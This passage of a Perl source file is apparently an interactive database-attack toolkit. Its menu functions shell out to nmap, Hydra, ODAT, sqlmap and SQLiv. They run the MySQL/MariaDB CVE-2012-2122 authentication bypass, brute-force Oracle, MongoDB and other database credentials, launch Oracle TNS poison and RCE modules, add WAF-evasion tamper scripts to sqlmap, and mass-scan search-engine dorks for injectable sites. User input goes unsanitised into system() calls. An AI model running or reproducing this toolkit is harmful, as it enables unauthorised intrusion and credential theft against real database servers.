    print item(),"Bypassing Authentication for MySQL using Defined Settings \n\n";
    print item(),"Enter Option : ";	
    chomp($option=<STDIN>);
    print item(),"Enter Port   : ";	
    chomp($port=<STDIN>);
    if (system("nmap $option $port--script mysql-vuln-cve2012-2122 $mysqlauthnbypassv") == 0) {
	print item(),"success!\n";
	}
	else {
	print item(),"Error, Command Failed\n";
	}
    }
}
    
#--------------------------------------------------------------#
#           24 - MariaDB - Authenitcation Bypass               #
#--------------------------------------------------------------#
sub mariaauthnbypass ( ) {
    print item(),"1 - Bypass Authentication for MariaDB using Port 3306   \n";
    print item(),"2 - Bypass Authentication for MariaDB using sV Option \n";    
    print item(),"3 - Bypass Authentication for MariaDB using Defined Settings \n";    
    print item(),"Enter Option: ";	
    chomp($enter=<STDIN>);
	if ($enter =~1) {      
    print item(),"Bypassing Authentication for MariaDB using Port 3306 \n\n";
    print item(),"Enter Option : ";	
    chomp($option=<STDIN>);
    print item(),"Enter Port   : ";	
    chomp($port=<STDIN>);
    if (system("nmap -p3306 --script mysql-vuln-cve2012-2122 $mariaauthnbypassv") == 0) {
	print item(),"success!\n";
	}
	else {
	print item(),"Error, Command Failed\n";
	}
}
    if ($enter =~2) {      
    print item(),"Bypassing Authentication for MariaDB using sV Option \n\n";
    print item(),"Enter Option : ";	
    chomp($option=<STDIN>);
    print item(),"Enter Port   : ";	
    chomp($port=<STDIN>);
    if (system("nmap -sV --script mysql-vuln-cve2012-2122 $mariaauthnbypassv") == 0) {
	print item(),"success!\n";
	}
	else {
	print item(),"Error, Command Failed\n";
	}
}
    if ($enter =~3) {      
    print item(),"Bypassing Authentication for MariaDB using Defined Settings \n\n";
    print item(),"Enter Option : ";	
    chomp($option=<STDIN>);
    print item(),"Enter Port   : ";	
    chomp($port=<STDIN>);
    if (system("nmap $option $port--script mysql-vuln-cve2012-2122 $mariaauthnbypassv") == 0) {
	print item(),"success!\n";
	}
	else {
	print item(),"Error, Command Failed\n";
	}
    }
}


#--------------------------------------------------------------#
#           25 - ORACLE - Brute Force                          #
#--------------------------------------------------------------#
sub oraclebruteforce ( ) {
    print item(),"Performing Brute Forcing against Oracle Server \n\n";
    if (system("nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=ORCL $oraclebruteforcev") == 0) {
	print item(),"success!\n";
	}
	else {
	print item(),"Error, Command Failed\n";
	}
    }
#--------------------------------------------------------------#
#           26 - ORACLE - TNS Listener                         #
#--------------------------------------------------------------#
sub oracletnsversion ( ) {
    print item(),"Decoding VSNNUM version number from Oracle TNS listener \n\n";
    if (system("nmap -sV $oracletnsversionv") == 0) {
	print item(),"success!\n";
	}
	else {
	print item(),"Error, Command Failed\n";
	}
    }
    
#--------------------------------------------------------------#
#           27 - ORACLE - Brute Stealth                        #
#--------------------------------------------------------------#
sub oraclepasswordhash ( ) {
    print item(),"Performing Session key to extract Password Hash \n\n";
    if (system("nmap --script oracle-brute-stealth -p 1521 --script-args oracle-brute-stealth.sid=ORCL $oraclepasswordhashv") == 0) {
	print item(),"success!\n";
	}
	else {
	print item(),"Error, Command Failed\n";
	}
    }
    
#--------------------------------------------------------------#
#           28 - ORACLE -  Enumerate User Names                #
#--------------------------------------------------------------#
sub oracleenumerateusernames ( ) {
    print item(),"Attempts to Enumerate Valid Oracle User Name \n\n";
    if (system("nmap --script oracle-enum-users --script-args oracle-enum-users.sid=ORCL,userdb=orausers.txt -p 1521-1560 $oracleenumerateusernamesv") == 0) {
	print item(),"success!\n";
	}
	else {
	print item(),"Error, Command Failed\n";
	}
    }

#--------------------------------------------------------------#
#           29 - ORACLE - TNS Poison Hack                      #
#--------------------------------------------------------------#
sub oracletnshack ( ) {
    print item(),"Check Oracle TNS Poison Hack \n\n";
    if (system("nmap –script=oracle-tns-poison.nse -p 1521 $oracletnshackv") == 0) {
	print item(),"success!\n";
	}
	else {
	print item(),"Error, Command Failed\n";
	}
    }
    

#--------------------------------------------------------------#
#           30 - ORACLE - Guess Oracle instance/SID            #
#--------------------------------------------------------------#
sub oraclesid ( ) {
    print item(), "Check Transparent Network Substrate (TNS) for unique database names known as SIDS \n\n";
    print item(),"1 - Find SIDS without script arguments   \n";
    print item(),"2 - Find SIDS using script arguments \n";        
    print item(),"Enter Option: ";	
    chomp($enter=<STDIN>);
	if ($enter =~1) {      
    print item(),"Finding SIDS without script arguments \n\n";
    print item(),"Path of SID File Name : ";	
    chomp($path=<STDIN>);    
    if (system("nmap --script=oracle-sid-brute --script-args=oraclesids=$path -p 1521-1560 $oraclesidv") == 0) {
	print item(),"success!\n";
	}
	else {
	print item(),"Error, Command Failed\n";
	}
}
    if ($enter =~2) {      
    print item(),"Finding SIDS using script arguments \n\n";    
    if (system("nmap --script=oracle-sid-brute -p 1521-1560 $oraclesidv ") == 0) {
	print item(),"success!\n";
	}
	else {
	print item(),"Error, Command Failed\n";
	}
	}
    }

#--------------------------------------------------------------#
#           31 - MangodB - List All Databases                  #
#--------------------------------------------------------------#
sub mangodbdatabases ( ) {
    print item(),"MangodB - List All Databases \n\n";
    if (system("nmap -p 27017 --script mongodb-databases $mangodbdatabasesv") == 0) {
	print item(),"success!\n";
	}
	else {
	print item(),"Error, Command Failed\n";
	}
    }

#--------------------------------------------------------------#
#           31 - MangodB - Peform Brute Force                  #
#--------------------------------------------------------------#
sub mangodBbruteforce ( ) {
    print item(),"Perform Brute Force against Database \n\n";
    if (system("nmap -p 27017 $mangodBbruteforcev --script mongodb-brute") == 0) {
	print item(),"success!\n";
	}
	else {
	print item(),"Error, Command Failed\n";
	}
    }

#--------------------------------------------------------------#
#           32 - MangodB - Get Info                            #
#--------------------------------------------------------------#
sub mangodBinfo ( ) {
    print item(),"Retrieve Build and Server Status \n\n";
    if (system("nmap -p 27017 --script mongodb-info $mangodBinfov") == 0) {
	print item(),"success!\n";
	}
	else {
	print item(),"Error, Command Failed\n";
	}
    }


#--------------------------------------------------------------#
#           33 - CouchdB - Get All Databases                   #
#--------------------------------------------------------------#
sub couchdBinfo ( ) {
    print item(),"Retrieve Build and Server Status \n\n";
    if (system("nmap -p5984 --script couchdb-databases $couchdBinfov") == 0) {
	print item(),"success!\n";
	}
	else {
	print item(),"Error, Command Failed\n";
	}
    }
    
#--------------------------------------------------------------#
#           34 - My-SQL Vulernability Combo                    #
#--------------------------------------------------------------#
sub mysqlvcombo ( ) {
    if (system("nmap -sV -Pn --script ms-sql* --script-args brute.threads=1,brute.start=1  $mysqlvcombov") == 0) {
	print item(),"success!\n";
	}
	else {
	print item(),"Error, Command Failed\n";
	}
    }


#--------------------------------------------------------------#
#           35 - CouchdB Vulnerability Combo                   #
#--------------------------------------------------------------#
sub couchdbvcombo ( ) {
    if (system("nmap -sV -Pn --script chouch* --script-args brute.threads=1,brute.start=1  $couchdbvcombov") == 0) {
	print item(),"success!\n";
	}
	else {
	print item(),"Error, Command Failed\n";
	}
    }


#--------------------------------------------------------------#
#           36 - MS-SQL Vulnerability Combo                    #
#--------------------------------------------------------------#
sub mssqlvcombo ( ) {
    if (system("nmap -sV -Pn --script ms-sql* --script-args brute.threads=1,brute.start=1  $mssqlvcombov") == 0) {
	print item(),"success!\n";
	}
	else {
	print item(),"Error, Command Failed\n";
	}
    }


#--------------------------------------------------------------#
#           37 - ORACLE Vulnerability Combo                    #
#--------------------------------------------------------------#
sub oraclevcombo ( ) {    
    if (system("nmap -sV -Pn --script oracle* --script-args brute.threads=1,brute.start=1  $oraclevcombov") == 0) {
	print item(),"success!\n";
	}
	else {
	print item(),"Error, Command Failed\n";
	}
    }


#--------------------------------------------------------------#
#           38 - InfluxDb Vulnerability Combo                  #
#--------------------------------------------------------------#
sub influxdbvcombo ( ) {
    if (system("nmap -sV -Pn -p8080,8081,8082,8083,8084,8085,8086,8087,8088 --script-args brute.threads=1,brute.start=1  $influxdbvcombov") == 0) {
	print item(),"success!\n";
	}
	else {
	print item(),"Error, Command Failed\n";
	}
    }


#--------------------------------------------------------------#
#           39 - MariadB Vulnerability Combo                   #
#--------------------------------------------------------------#
sub mariadbvcombo ( ) {    
    if (system("nmap -sV --script vuln --script-args brute.threads=1,brute.start=1 -p3306 $mariadbvcombov") == 0) {
	print item(),"success!\n";
	}
	else {
	print item(),"Error, Command Failed\n";
	}
    }
    
#--------------------------------------------------------------#
#           40 - Oracle - Hydra Brute Force                    #
#--------------------------------------------------------------#
sub hydraoracle ( ) {
    print item(),"Hint: provide rockyou.txt, it should be in share folder \n";        
    print item(),"1 - Hydra Oracle Listener Brute Force \n";    
    print item(),"2 - Hydra Oracle SIDs Brute Force \n";
    print item(),"3 - Hydra Oracle SQL-Login Brute Force \n";             
    print item(),"Enter Option: ";	
    chomp($enter=<STDIN>);
	if ($enter =~1) {      
    print item(),"Enter Oracle Port Number : ";	    
    chomp($port=<STDIN>);        
    print item(),"Enter Brute Force File   : ";	    
    chomp($brute=<STDIN>);        
    if (system("hydra -P $brute -t 32 -s $port $hydraoraclev oracle-listener") == 0) {
	print item(),"success!\n";
	}
	else {
	print item(),"Error, Command Failed\n";
	}
    }
        if ($enter =~2) {      
    print item(),"Enter Oracle Port Number : ";	    
    chomp($port=<STDIN>);            
    if (system("hydra -L /usr/share/oscanner/lib/services.txt -s $port $hyraoraclev oracle-sid") == 0) {
	print item(),"success!\n";
	}
	else {
	print item(),"Error, Command Failed\n";
	}
	    
}
        if ($enter =~3) {      
    print item(),"Enter Oracle User Name : ";	    
    chomp($name=<STDIN>);            
    print item(),"Enter Oracle Pass Name : ";	    
    chomp($pass=<STDIN>);            
    print item(),"Enter Oracle Port Number : ";	    
    chomp($port=<STDIN>);            
    if (system("hydra -L $user -P $pass -s $port $hydraoraclev oracle /PLSEXTPROC") == 0) {
	print item(),"success!\n";
	}
	else {
	print item(),"Error, Command Failed\n";
	}
	    
}


}


#--------------------------------------------------------------#
#           41 - Oscanner - Enumerate SIDS and Valid Passwords #
#--------------------------------------------------------------#
sub oscanner ( ) {
    print item(),"Enter Oracle Port Number : ";	    
    chomp($port=<STDIN>);            
    if (system("oscanner -s $oscannerv -P $port ") == 0) {
	print item(),"success!\n";
	}
	else {
	print item(),"Error, Command Failed\n";
	}
    }
    

#--------------------------------------------------------------#
#           42 - Odat - Load All Oracle Attack Modules         #
#--------------------------------------------------------------#
sub odatscanner ( ) {
    print item(),"Enter Oracle Port Number : ";	    
    chomp($port=<STDIN>);            
    if (system("odat.py all -s $odatscannerv -p $port") == 0) {
	print item(),"success!\n";
	}
	else {
	print item(),"Error, Command Failed\n";
	}
    }
    

#--------------------------------------------------------------#
#           43 - 0dat - TNS CMD RCE Poison                     #
#--------------------------------------------------------------#
sub odatscannertnscmd ( ) {    
    print item(),"Enter Oracle Port Number : ";	    
    chomp($port=<STDIN>);            
    if (system("odat.py tnscmd -s $odatscannertnscmdv -p $port --indent") == 0) {
	print item(),"success!\n";
	print item(),"Refer to this guide now: https://medium.com/@iphelix/hacking-oracle-tns-listener-c74070bde8e4\n";
	}
	else {
	print item(),"Error, Command Failed\n";
	}
    }

#--------------------------------------------------------------#
#           44 - Check RDP, MS RPC and Netbios Ports           #
#--------------------------------------------------------------#
sub nmapchecks ( ) {
    if (system("nmap -sV --script vuln --script-args brute.threads=1,brute.start=1  $nmapchecksv") == 0) {
	print item(),"success!\n";	
	}
	else {
	print item(),"Error, Command Failed\n";
	}
    }

#--------------------------------------------------------------#
#           45 - Find IIS Directories                          #
#--------------------------------------------------------------#
sub findiis ( ) {
    if (system("dirb $findiisv") == 0) {
	print item(),"success!\n";	
	}
	else {
	print item(),"Error, Command Failed\n";
	}
    }

#--------------------------------------------------------------#
#           46 - Perform Nikto Scan                            #
#--------------------------------------------------------------#
sub nikto ( ) {
    if (system("nikto -Display 1234EP -o report.html -Format htm -Tuning 123bde -host $niktov") == 0) {
	print item(),"success!\n";	
	}
	else {
	print item(),"Error, Command Failed\n";
	}
    }

#--------------------------------------------------------------#
#           47 - Perform SQL MAP Scan                          #
#--------------------------------------------------------------#
sub sqlmap ( ) {    
    if (system("sqlmap -u '$sqlmapv' --tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,randomcomments,securesphere,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords") == 0) {
	print item(),"success!\n";	
	}
	else {
	print item(),"Error, Command Failed\n";
	}
    }
    

#--------------------------------------------------------------#
#           48 - SqlIV Scan                                    #
#--------------------------------------------------------------#
sub sqliv ( ) {
    print item(),"Hint: File will be saved as searches.txt as per search \n";    
    print item(),"1 - SQLIV Mass Dork Scans using google\n";    
    print item(),"2 - SQLIV Mass Dork Scans using yahoo\n";    
    print item(),"3 - SQLIV Mass Dork Scans using bing\n";    
    print item(),"4 - SQLIV Parameter Scan \n";
    print item(),"Enter Option: ";	
    chomp($enter=<STDIN>);
	if ($enter =~1) {
    print item(),"Enter Dork, Refer to Google Dorks \n";             
    chomp($dork=<STDIN>);
    if (system("python sqliv.py -d '$dork' -e google -p 100 -s") == 0) {
	print item(),"success!\n";	
	}
	else {
	print item(),"Error, Command Failed\n";
	}
    }
    if ($enter =~2) {
    print item(),"Enter Dork, Refer to Yahoo Dorks \n";             
    chomp($dork=<STDIN>);
    if (system("python sqliv.py -d '$dork' -e yahoo -p 100 -s") == 0) {
	print item(),"success!\n";	
	}
	else {
	print item(),"Error, Command Failed\n";
	}
    }
    if ($enter =~3) {
    print item(),"Enter Dork, Refer to Bing Dorks \n";             
    chomp($dork=<STDIN>);
    if (system("python sqliv.py -d '$dork' -e bing -p 100 -s") == 0) {
	print item(),"success!\n";	
	}
	else {
	print item(),"Error, Command Failed\n";
	}
    }
if (system("python sqliv.py -t $sqlivv ") == 0) {
	print item(),"success!\n";	
	}
	else {
	print item(),"Error, Command Failed\n";
	}	
	
    }

#--------------------------------------------------------------#
#           49 - Capture Words for Website                     #
#--------------------------------------------------------------#
sub cewl ( ) {    
    if (system("cewl -d 2 -m 5 -w docswords.txt $cewlv") == 0) {
	print item(),"success!\n";	
	}
	else {
	print item(),"Error, Command Failed\n";
	}
    }

#--------------------------------------------------------------#
#           50 - Show URI                                      #
#--------------------------------------------------------------#
sub uri ( ) {
    print item(),"Hint: Crawl and Provide links.txt \n ";	
    print item(),"Enter Path of File Containing Links \n ";	
    chomp($urivv=<STDIN>);
    if (system("perl value.pl < $urivv") == 0) {
	print item(),"success!\n";	
	}
	else {
	print item(),"Error, Command Failed\n";
	}
        }

#--------------------------------------------------------------#
#           51 - Links Crawler                                 #
#--------------------------------------------------------------#
sub crawler ( ) {
    print item(),"File output : links.txt \n ";	    
    if (system("python3 cobra.py --wait=2 --download $crawlerv > links.txt") == 0) {
	print item(),"success!\n";	
	}
	else {
	print item(),"Error, Command Failed\n";
	}
        }

#--------------------------------------------------------------#
#           52 - Database Dorks                                #
#--------------------------------------------------------------#
sub databasedorks ( ) {
    print item(),"Hint: Inject directly into google search \n ";	    
    print item(),"Showing Database Dorks \n ";	    
    if (system("cat databasedorks") == 0) {
	print "\n";
	print item(),"success!\n";	
	}
	else {
	print item(),"Error, Command Failed\n";
	}
        }


#--------------------------------------------------------------#
#                            Enter                             #
#--------------------------------------------------------------#
sub enter {
    print "\n";
    print item(),"Press ";
    print color('bold red'),"[";
    print color("bold white"),"ENTER";
    print color('bold red'),"] ";
    print color("bold white"),"To Continue\n";

    local( $| ) = ( 1 );

    my $resp = <STDIN>;
    banner();
    menu();
}

#--------------------------------------------------------------#
#                             Format                           #
#--------------------------------------------------------------#
sub item
{
    my $n = shift // '!';
    return color('bold red')," ["
    , color('bold green'),"$n"
    , color('bold red'),"] "
    , color("bold white")
    ;
}

sub line_u
{
    return 
    color('bold cyan'),"					#--------------------------------------------------------------------------# \n",
    "					#                                                                          # \n";
    
}

sub line_d
{
    return
    color('bold cyan'),"					#                                                                          # \n",
    color('bold cyan'),"					#--------------------------------------------------------------------------# ",
    "                                                                    ";
}
#--------------------------------------------------------------#
#                          ~~The End~~                         #
#--------------------------------------------------------------#

